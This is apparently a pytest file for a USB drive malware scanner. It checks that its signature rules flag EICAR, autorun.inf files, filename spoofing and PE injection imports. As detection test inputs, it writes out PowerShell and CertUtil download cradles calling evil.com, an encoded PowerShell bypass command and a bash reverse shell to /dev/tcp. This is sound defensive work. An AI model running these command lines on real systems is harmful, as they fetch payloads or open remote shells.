from pathlib import Path

from usb_analyzer.core.events import DeviceEvent, EventSeverity
from usb_analyzer.policy.engine import PolicyEngine
from usb_analyzer.policy.enforcement import MockDeviceBlocker
from usb_analyzer.policy.models import PolicyMode
from usb_analyzer.policy.store import WhitelistStore
from usb_analyzer.storage_scanner.scanner import scan_path
from usb_analyzer.storage_scanner.service import StorageScanService
from usb_analyzer.storage_scanner.signatures import (
    EICAR_SHA256,
    EICAR_STRING,
    SignatureEngine,
    YaraRule,
)


def test_signature_engine_eicar_hash():
    engine = SignatureEngine()
    threat = engine.check_hash(EICAR_SHA256)
    assert threat is not None
    assert "EICAR" in threat


def test_signature_engine_rules():
    engine = SignatureEngine()

    # 1. EICAR content
    eicar_matches = engine.scan_content(EICAR_STRING)
    rule_names = [m[0] for m in eicar_matches]
    assert "EICAR_Test_File" in rule_names

    # 2. Suspicious autorun
    autorun_content = b"[AutoRun]\r\nopen=setup.exe\r\naction=Run Setup"
    autorun_matches = engine.scan_content(autorun_content, filename="autorun.inf")
    rule_names = [m[0] for m in autorun_matches]
    assert "Suspicious_Autorun_Inf" in rule_names

    # 3. PowerShell download cradle
    ps_content = b"powershell.exe -w hidden (New-Object Net.WebClient).DownloadString('http://evil.com/x')"
    ps_matches = engine.scan_content(ps_content, filename="script.ps1")
    rule_names = [m[0] for m in ps_matches]
    assert "PowerShell_Download_Cradle" in rule_names

    # 4. Clean content
    clean_matches = engine.scan_content(b"Hello world! This is a benign text file.")
    assert len(clean_matches) == 0

    # 5. Encoded PowerShell
    ps_enc = b"powershell.exe -NoProfile -ExecutionPolicy Bypass -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA=="
    enc_matches = engine.scan_content(ps_enc)
    assert any(m[0] == "PowerShell_Encoded_Command" for m in enc_matches)

    # 6. CertUtil download cradle
    certutil_content = b"certutil -urlcache -split -f http://evil.com/payload.exe payload.exe"
    cu_matches = engine.scan_content(certutil_content)
    assert any(m[0] == "CertUtil_Download_Cradle" for m in cu_matches)

    # 7. Double extension masquerade
    de_matches = engine.scan_content(b"dummy", filename="Corporate_Report.pdf.exe")
    assert any(m[0] == "Double_Extension_Masquerade" for m in de_matches)

    # 8. RTLO character spoofing
    rtlo_name = "Invoice_2026\u202Efdp.exe"
    rtlo_matches = engine.scan_content(b"dummy", filename=rtlo_name)
    assert any(m[0] == "RTLO_Character_Spoof" for m in rtlo_matches)


def test_disguised_pe_executable(tmp_path: Path):
    engine = SignatureEngine()
    fake_image = tmp_path / "avatar.jpg"
    # Create fake PE file (MZ header at offset 0, valid size)
    pe_header = b"MZ" + b"\x00" * 58 + b"\x80\x00\x00\x00" + b"\x00" * 68 + b"PE\x00\x00" + b"\x00" * 100
    fake_image.write_bytes(pe_header)

    flags = engine.scan_file(fake_image, sha256="abc123")
    assert "yara:Disguised_PE_Executable" in flags


def test_scenario_2_infected_drive_scan(tmp_path: Path):
    # Scenario 2 from proposal:
    # "Infected drive: EICAR test file plus a fake autorun.inf -> High-severity alert"
    test_root = tmp_path / "usb_drive"
    test_root.mkdir()

    # Create custom test signature engine so Defender on Windows doesn't delete the test file mid-test
    mock_malware_hash = "111122223333444455556666777788889999aaaabbbbccccddddeeeeffff0000"
    engine = SignatureEngine(
        known_hashes={mock_malware_hash: "Test Trojan Payload"},
        custom_rules=[
            YaraRule(
                name="Trojan_Test_Sig",
                description="Simulated malware test signature",
                patterns=[b"MALICIOUS_SIMULATION_STRING_V1"],
            )
        ],
    )

    infected_file = test_root / "suspicious_payload.bin"
    infected_file.write_bytes(b"MALICIOUS_SIMULATION_STRING_V1 extra data")

    autorun_file = test_root / "autorun.inf"
    autorun_file.write_text("[AutoRun]\nopen=suspicious_payload.bin\naction=Open Drive")

    clean_file = test_root / "document.txt"
    clean_file.write_text("Legitimate financial document")

    result = scan_path(test_root, signature_engine=engine)

    assert result.has_threats is True
    assert len(result.files) == 3
    assert len(result.flagged) == 2

    flagged_map = {f.path: f for f in result.flagged}
    assert "suspicious_payload.bin" in flagged_map
    assert "autorun.inf" in flagged_map

    sig_flags = flagged_map["suspicious_payload.bin"].flags
    assert any("Trojan_Test_Sig" in f for f in sig_flags)

    autorun_flags = flagged_map["autorun.inf"].flags
    assert "autorun_inf" in autorun_flags
    assert any("yara:Suspicious_Autorun_Inf" in f for f in autorun_flags)


class FakeEventSink:
    def __init__(self):
        self.events: list[DeviceEvent] = []

    def add(self, event: DeviceEvent) -> DeviceEvent:
        self.events.append(event)
        return event


def test_scenario_2_service_critical_alert_and_block(tmp_path: Path):
    test_root = tmp_path / "infected_usb"
    test_root.mkdir()
    (test_root / "script.ps1").write_text("Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bad.com')")
    (test_root / "autorun.inf").write_text("[autorun]\nshellexecute=payload.bat")

    sink = FakeEventSink()
    store = WhitelistStore(tmp_path / "test.db")
    blocker = MockDeviceBlocker()
    engine = PolicyEngine(store=store, blocker=blocker, mode=PolicyMode.ENFORCE)

    service = StorageScanService(
        event_sink=sink,
        policy_engine=engine,
        max_workers=1,
    )

    device_id = "USBSTOR\\DISK&VEN_INFECTED&PROD_DRIVE\\0014D9999999&0"
    service._scan(device_id, str(test_root))

    event_types = [e.event_type for e in sink.events]
    assert "scan.completed" in event_types
    assert "device.blocked" in event_types

    scan_event = next(e for e in sink.events if e.event_type == "scan.completed")
    assert scan_event.severity == EventSeverity.CRITICAL
    assert scan_event.details["has_threats"] is True
    assert device_id in blocker.blocked_devices


def test_yar_rules_file_loading_and_lnk_reverse_shell_detection(tmp_path: Path) -> None:
    engine = SignatureEngine()
    inventory = engine.get_rule_inventory()
    rule_names = {r["name"] for r in inventory}

    assert {"EICAR_Test_File", "PowerShell_Download_Cradle", "LNK_Embedded_Command_Dropper", "Reverse_Shell_Primitive"}.issubset(rule_names)

    # Simulate malicious Windows .lnk header + UTF-16LE embedded PowerShell payload
    lnk_bytes = b"L\x00\x00\x00\x01\x14\x02\x00" + b"\x00" * 32 + "powershell.exe -w hidden".encode("utf-16-le")
    lnk_matches = [m[0] for m in engine.scan_content(lnk_bytes, filename="Documents.lnk")]
    assert "LNK_Embedded_Command_Dropper" in lnk_matches

    # Reverse shell primitive rule from usb_malware.yar
    revshell_bytes = b"bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"
    rs_matches = [m[0] for m in engine.scan_content(revshell_bytes, filename="run.sh")]
    assert "Reverse_Shell_Primitive" in rs_matches

    # Heuristic keyword indicator flags suspicious doc non-destructively without yara: deletion
    doc = tmp_path / "USB_Malware_Analysis_Notes.txt"
    doc.write_text("Discussion of ransomware and keylogger defense concepts.", encoding="utf-8")
    flags = engine.scan_file(doc, sha256="deadbeef")
    assert "suspicious_keyword_indicator" in flags
    assert not any(f.startswith("yara:") for f in flags)


def test_md5_ioc_file_pe_yar_rules_and_zip_member_inspection(tmp_path: Path) -> None:
    import zipfile
    from usb_analyzer.storage_scanner.signatures import EICAR_MD5

    engine = SignatureEngine()
    # Loaded from malware_hashes.txt
    assert engine.check_hash("unused", md5=EICAR_MD5) is not None
    assert engine.check_hash("ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa") is not None

    # Compiled PE import & UPX rules
    pe_sample = b"MZ" + b"\x00" * 60 + b"VirtualAlloc\x00WriteProcessMemory\x00SetWindowsHookEx\x00GetAsyncKeyState\x00UPX0"
    matched_rules = {m[0] for m in engine.scan_content(pe_sample, filename="spy.exe")}
    assert {"Suspicious_PE_Injection_APIs", "Suspicious_PE_Keylogger_APIs", "UPX_Packed_PE_Binary"}.issubset(matched_rules)

    # Zip archive containing disguised script payload should be scanned safely
    z_path = tmp_path / "bundle.zip"
    with zipfile.ZipFile(z_path, "w") as zf:
        zf.writestr("inner_dropper.vbs", 'Set x = CreateObject("WScript.Shell"): Set a = CreateObject("ADODB.Stream")')
    z_flags = engine.scan_file(z_path, sha256="0" * 64, md5="0" * 32)
    assert "yara:VBS_WScript_Download_Dropper" in z_flags
